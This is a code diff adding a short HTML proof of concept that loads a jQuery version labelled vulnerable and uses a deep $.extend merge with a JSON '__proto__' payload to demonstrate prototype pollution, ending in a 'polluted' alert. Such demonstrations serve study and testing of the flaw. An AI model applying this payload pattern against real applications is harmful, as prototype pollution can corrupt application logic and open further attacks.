@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <!-- vulnerable version -->
+  <script src="https://code.jquery.com/jquery-3.3.0.js"></script>
+</head>
+<body>
+
+<script>
+  $(document).ready(function() {
+    var obj1 = {
+      Name: "isac"
+    };
+
+    var obj2 = JSON.parse('{"__proto__": {"is_polluted":true}}');
+
+    var extended_obj1 = $.extend(true,{}, obj1, obj2);
+
+    var obj = {}
+    console.log(obj);
+
+    if(is_polluted == true)
+    {
+        alert("polluted");
+    }
+  });
+
+</script>
+</body>
+</html>
